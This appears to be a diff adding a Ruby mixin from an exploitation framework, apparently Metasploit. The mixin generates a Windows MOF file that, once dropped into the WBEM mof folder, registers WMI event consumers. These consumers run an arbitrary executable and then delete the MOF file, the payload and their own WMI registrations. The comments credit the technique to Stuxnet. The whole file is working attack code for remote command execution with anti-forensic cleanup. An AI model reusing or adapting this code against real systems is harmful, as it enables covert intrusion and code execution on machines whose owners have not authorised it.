@@ -1,0 +1,99 @@
+# -*- coding: binary -*-
+
+#
+# This mixin enables executing arbitrary commands via the
+# Windows Management Instrumentation service.
+#
+# By writing the output of these methods to %SystemRoot%\system32\WBEM\mof,
+# your command line will be executed.
+#
+# This technique was used as part of Stuxnet and further reverse engineered
+# to this form by Ivanlef0u and jduck.
+#
+
+module Msf
+module Exploit::WbemExec
+
+def generate_mof(mofname, exe)
+
+  classname = rand(0xffff).to_s
+
+  # From Ivan's decompressed version
+  mof = <<-EOT
+#pragma namespace("\\\\\\\\.\\\\root\\\\cimv2")
+class MyClass@CLASS@
+{
+  	[key] string Name;
+};
+class ActiveScriptEventConsumer : __EventConsumer
+{
+ 	[key] string Name;
+  	[not_null] string ScriptingEngine;
+  	string ScriptFileName;
+  	[template] string ScriptText;
+  uint32 KillTimeout;
+};
+instance of __Win32Provider as $P
+{
+    Name  = "ActiveScriptEventConsumer";
+    CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
+    PerUserInitialization = TRUE;
+};
+instance of __EventConsumerProviderRegistration
+{
+  Provider = $P;
+  ConsumerClassNames = {"ActiveScriptEventConsumer"};
+};
+Instance of ActiveScriptEventConsumer as $cons
+{
+  Name = "ASEC";
+  ScriptingEngine = "JScript";
+  ScriptText = "\\ntry {var s = new ActiveXObject(\\"Wscript.Shell\\");\\ns.Run(\\"@EXE@\\");} catch (err) {};\\nsv = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");try {sv.Delete(\\"MyClass@CLASS@\\");} catch (err) {};try {sv.Delete(\\"__EventFilter.Name='instfilt'\\");} catch (err) {};try {sv.Delete(\\"ActiveScriptEventConsumer.Name='ASEC'\\");} catch(err) {};";
+
+};
+Instance of ActiveScriptEventConsumer as $cons2
+{
+  Name = "qndASEC";
+  ScriptingEngine = "JScript";
+  ScriptText = "\\nvar objfs = new ActiveXObject(\\"Scripting.FileSystemObject\\");\\ntry {var f1 = objfs.GetFile(\\"wbem\\\\\\\\mof\\\\\\\\good\\\\\\\\#{mofname}\\");\\nf1.Delete(true);} catch(err) {};\\ntry {\\nvar f2 = objfs.GetFile(\\"@EXE@\\");\\nf2.Delete(true);\\nvar s = GetObject(\\"winmgmts:root\\\\\\\\cimv2\\");s.Delete(\\"__EventFilter.Name='qndfilt'\\");s.Delete(\\"ActiveScriptEventConsumer.Name='qndASEC'\\");\\n} catch(err) {};";
+};
+instance of __EventFilter as $Filt
+{
+  Name = "instfilt";
+  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \\"MyClass@CLASS@\\"";
+  QueryLanguage = "WQL";
+};
+instance of __EventFilter as $Filt2
+{
+  Name = "qndfilt";
+  Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \\"Win32_Process\\" AND TargetInstance.Name = \\"@EXE@\\"";
+  QueryLanguage = "WQL";
+
+};
+instance of __FilterToConsumerBinding as $bind
+{
+  Consumer = $cons;
+  Filter = $Filt;
+};
+instance of __FilterToConsumerBinding as $bind2
+{
+  Consumer = $cons2;
+  Filter = $Filt2;
+};
+instance of MyClass@CLASS@ as $MyClass
+{
+  Name = "ClassConsumer";
+};
+EOT
+
+  # Replace the input vars
+  mof.gsub!(/@CLASS@/, classname)
+  mof.gsub!(/@EXE@/, exe)  # NOTE: \ and " should be escaped
+
+  mof
+end
+
+end
+end
+
+
